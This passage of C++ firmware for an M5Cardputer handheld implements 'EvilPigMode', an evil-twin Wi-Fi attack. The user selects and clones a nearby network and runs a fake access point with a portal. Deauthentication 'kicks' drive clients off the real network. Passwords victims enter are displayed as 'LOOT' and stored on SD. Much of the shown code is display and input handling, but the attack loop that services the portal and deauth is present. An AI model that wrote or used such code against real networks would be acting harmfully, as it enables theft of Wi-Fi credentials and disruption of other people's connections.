    if (M5Cardputer.Keyboard.isKeyPressed('v') || M5Cardputer.Keyboard.isKeyPressed('V')) {
        if (!keyWas) {
            keyWas = true;
            openLoot();
        }
        return;
    }
    if (keyEsc()) {
        if (!keyWas) {
            keyWas = true;
            stop();
        }
        return;
    }
    if (!M5Cardputer.Keyboard.isPressed()) keyWas = false;
}

void EvilPigMode::handleInputLoot() {
    static bool keyWas = false;
    if (!M5Cardputer.Keyboard.isChange() && !M5Cardputer.Keyboard.isPressed()) {
        keyWas = false;
        return;
    }
    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
        if (!keyWas && lootScroll > 0) {
            keyWas = true;
            lootScroll--;
        }
        return;
    }
    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
        if (!keyWas && catchCount > 0 && lootScroll + 4 < catchCount) {
            keyWas = true;
            lootScroll++;
        }
        return;
    }
    // ` / Enter / V = back to previous phase
    if (keyEsc() ||
        M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) ||
        M5Cardputer.Keyboard.isKeyPressed('v') ||
        M5Cardputer.Keyboard.isKeyPressed('V')) {
        if (!keyWas) {
            keyWas = true;
            phase = phaseBeforeLoot;
        }
        return;
    }
    if (!M5Cardputer.Keyboard.isPressed()) keyWas = false;
}

void EvilPigMode::update() {
    if (!running) return;

    if (phase == Phase::LOOT) {
        // Keep portal alive while browsing loot
        if (phaseBeforeLoot == Phase::PORTAL) {
            servicePortalNet();
            tickDeauth();
        }
        if (!App::windowHidden()) handleInputLoot();
        return;
    }

    if (phase == Phase::SELECT) {
        uint8_t cl[EP_NET_MAX];
        memset(cl, 0, sizeof(cl));
        epCliTick(listCount, cl);
        for (uint8_t i = 0; i < listCount && i < EP_NET_MAX; i++)
            list[i].clients = cl[i];
        if (!App::windowHidden()) handleInputSelect();
        return;
    }

    if (!App::windowHidden()) handleInputPortal();
    servicePortalNet();
    tickDeauth();

    uint8_t cl = getClientCount();
    // Track softAP joins/leaves so UI shows live process status
    if (cl != s_prevSoftApClients) {
        if (cl > s_prevSoftApClients) {
            snprintf(lastEvent, sizeof(lastEvent), "CL JOIN %u", (unsigned)cl);
            setStatus("CLIENT ON");
        } else if (cl == 0) {
            snprintf(lastEvent, sizeof(lastEvent), "CL LEFT");
            setStatus(deauthOn ? "PORTAL+DEAUTH" : "PORTAL");
        } else {
            snprintf(lastEvent, sizeof(lastEvent), "CL %u", (unsigned)cl);
        }
        s_prevSoftApClients = cl;
    }
    if (cl > 0) Avatar::setState(AvatarState::EXCITED);
    else if (hitCount > 0) Avatar::setState(AvatarState::HAPPY);
    else Avatar::setState(deauthOn ? AvatarState::HUNTING : AvatarState::NEUTRAL);
}

const char* EvilPigMode::getBottomHint() {
    static char buf[40];
    uint8_t page = (uint8_t)((millis() / 2200u) & 3u);
    if (phase == Phase::PORTAL) {
        if (page & 1) {
            snprintf(buf, sizeof(buf), "HIT %u  ON %u  K %lu",
                     (unsigned)hitCount, (unsigned)getClientCount(),
                     (unsigned long)deauthCount);
            return buf;
        }
        return "K KICK  V LOOT  ESC EXIT";
    }
    if (phase == Phase::LOOT) return "^/v  V/ENT BACK";
    if (page == 0) return "^/v  ENT CLONE";
    if (page == 1) return "R rescan  V loot";
    return "ESC EXIT";
}

// Clip helper: write at most maxLen chars into out (null-terminated)
static void clipStr(char* out, size_t outSz, const char* in, size_t maxLen) {
    if (!out || outSz == 0) return;
    if (!in) { out[0] = '\0'; return; }
    size_t n = strlen(in);
    if (n > maxLen) n = maxLen;
    if (n >= outSz) n = outSz - 1;
    memcpy(out, in, n);
    out[n] = '\0';
    if (strlen(in) > maxLen && n >= 2) {
        out[n - 2] = '.';
        out[n - 1] = '.';
    }
}

void EvilPigMode::drawSelect(M5Canvas& canvas) {
    canvas.fillSprite(UiStyle::BG);
    canvas.setTextSize(1);
    canvas.setTextDatum(top_left);
    canvas.setFont(&fonts::Font0);
    canvas.setTextWrap(false);

    canvas.setTextColor(UiStyle::DIM);
    char hdr[32];
    if (listCount > 0) {
        snprintf(hdr, sizeof(hdr), "%u/%u",
                 (unsigned)(listIdx + 1), (unsigned)listCount);
    } else {
        snprintf(hdr, sizeof(hdr), "0 net");
    }
    canvas.drawString(hdr, 4, 2);
    canvas.drawString("CL  dB CH", 150, 2);

    if (listCount == 0) {
        canvas.setTextColor(UiStyle::GOLD);
        canvas.drawString("scan...", 4, 36);
        canvas.setTextColor(UiStyle::DIM);
        canvas.drawString("R = rescan nets", 4, 52);
        return;
    }

    ensureListVisible();

    const int rowH = 16;
    const int y0 = 14;
    const int nameMax = 140;
    for (uint8_t i = 0; i < VISIBLE && (listScroll + i) < listCount; i++) {
        uint8_t idx = listScroll + i;
        const NetPick& p = list[idx];
        bool sel = (idx == listIdx);
        int y = y0 + (int)i * rowH;

        if (sel) {
            canvas.fillRect(0, y, DISPLAY_W, rowH - 1, UiStyle::PINK);
            canvas.setTextColor(UiStyle::BG);
        } else {
            canvas.setTextColor(UiStyle::TEXT);
        }

        const char* ss = p.ssid[0] ? p.ssid : "(hidden)";
        if (sel) uiDrawMarquee(canvas, ss, 4, y + 4, nameMax);
        else {
            char name[24];
            clipStr(name, sizeof(name), ss, 22);
            canvas.drawString(name, 4, y + 4);
        }

        char meta[20];
        snprintf(meta, sizeof(meta), "%2u %4d %2u",
                 (unsigned)p.clients, (int)p.rssi, (unsigned)p.channel);
        canvas.drawString(meta, 148, y + 4);
    }

    // Subtle more-above / more-below markers
    if (listScroll > 0) {
        canvas.setTextColor(UiStyle::DIM);
        canvas.drawString("^", DISPLAY_W - 10, 14);
    }
    if (listScroll + VISIBLE < listCount) {
        canvas.setTextColor(UiStyle::DIM);
        canvas.drawString("v", DISPLAY_W - 10, y0 + (VISIBLE - 1) * rowH + 4);
    }
}

void EvilPigMode::drawPortal(M5Canvas& canvas) {
    // SSID + live process + key legend.
    canvas.fillSprite(UiStyle::BG);
    canvas.setTextSize(1);
    canvas.setTextDatum(top_left);
    canvas.setFont(&fonts::Font0);

    uint8_t cl = getClientCount();

    // Kick badge top-right
    canvas.setTextColor(deauthOn ? UiStyle::RED : UiStyle::DIM);
    canvas.drawString(deauthOn ? "KICK" : "idle", DISPLAY_W - 36, 2);

    canvas.setTextWrap(false);
    canvas.setTextColor(UiStyle::TITLE);
    canvas.setTextSize(2);
    uiDrawMarquee(canvas, apSsid[0] ? apSsid : "-", 4, 10, DISPLAY_W - 48, 12);
    canvas.setTextSize(1);

    // Live client connection line — green when someone is on softAP
    canvas.setTextColor(cl > 0 ? UiStyle::GREEN : UiStyle::DIM);
    char clLine[36];
    if (cl > 0) {
        snprintf(clLine, sizeof(clLine), "CLIENT ON  x%u", (unsigned)cl);
    } else {
        snprintf(clLine, sizeof(clLine), "wait client...");
    }
    canvas.drawString(clLine, 4, 30);

    // Counters: ON / HIT / KICK
    canvas.setTextColor(UiStyle::DIM);
    canvas.drawString("ON", 8, 44);
    canvas.drawString("HIT", 80, 44);
    canvas.drawString("KICK", 152, 44);

    canvas.setTextColor(cl > 0 ? UiStyle::GREEN : UiStyle::CYAN);
    canvas.setTextSize(2);
    char n1[8], n2[8], n3[12];
    snprintf(n1, sizeof(n1), "%u", (unsigned)cl);
    snprintf(n2, sizeof(n2), "%u", (unsigned)hitCount);
    snprintf(n3, sizeof(n3), "%lu", (unsigned long)deauthCount);
    canvas.drawString(n1, 8, 54);
    canvas.setTextColor(hitCount > 0 ? UiStyle::GOLD : UiStyle::CYAN);
    canvas.drawString(n2, 80, 54);
    canvas.setTextColor(UiStyle::CYAN);
    canvas.drawString(n3, 152, 54);
    canvas.setTextSize(1);

    // Process feed: last event (VIEW / CL JOIN / +1 HIT / KICK xN)
    canvas.setTextColor(UiStyle::PINK);
    char ev[28];
    clipStr(ev, sizeof(ev), lastEvent, 24);
    canvas.drawString(ev, 4, 74);

    canvas.setTextColor(UiStyle::DIM);
    char ipLine[36];
    snprintf(ipLine, sizeof(ipLine), "ch%u  %s",
             (unsigned)apChannel, WiFi.softAPIP().toString().c_str());
    canvas.drawString(ipLine, 4, 86);
}

void EvilPigMode::drawLoot(M5Canvas& canvas) {
    // Newest-first list: SSID + password + keys.
    canvas.fillSprite(UiStyle::BG);
    canvas.setTextSize(1);
    canvas.setTextDatum(top_left);
    canvas.setFont(&fonts::Font0);

    canvas.setTextColor(UiStyle::TITLE);
    char title[20];
    snprintf(title, sizeof(title), "LOOT  %u", (unsigned)catchCount);
    canvas.drawString(title, 4, 2);
    canvas.setTextWrap(false);

    if (catchCount == 0) {
        canvas.setTextColor(UiStyle::GOLD);
        canvas.drawString("empty", 4, 36);
        canvas.setTextColor(UiStyle::DIM);
        canvas.drawString("SD: /0N3P0rK/evilpig", 4, 52);
        return;
    }

    const int rowH = 20;
    const int y0 = 16;
    const uint8_t visible = 4;
    for (uint8_t i = 0; i < visible && (lootScroll + i) < catchCount; i++) {
        uint8_t idx = catchCount - 1 - (lootScroll + i);
        const Catch& c = catches[idx];
        int y = y0 + (int)i * rowH;

        canvas.fillRect(2, y, DISPLAY_W - 4, rowH - 2, UiStyle::PANEL);

        canvas.setTextColor(UiStyle::CYAN);
        uiDrawMarquee(canvas, c.ssid[0] ? c.ssid : "-", 6, y + 1, DISPLAY_W - 16);

        canvas.setTextColor(UiStyle::TEXT);
        uiDrawMarquee(canvas, c.pwShow[0] ? c.pwShow : "-", 6, y + 10, DISPLAY_W - 16);
    }
}

void EvilPigMode::draw(M5Canvas& canvas) {
    if (phase == Phase::SELECT) drawSelect(canvas);
    else if (phase == Phase::LOOT) drawLoot(canvas);
    else drawPortal(canvas);
}
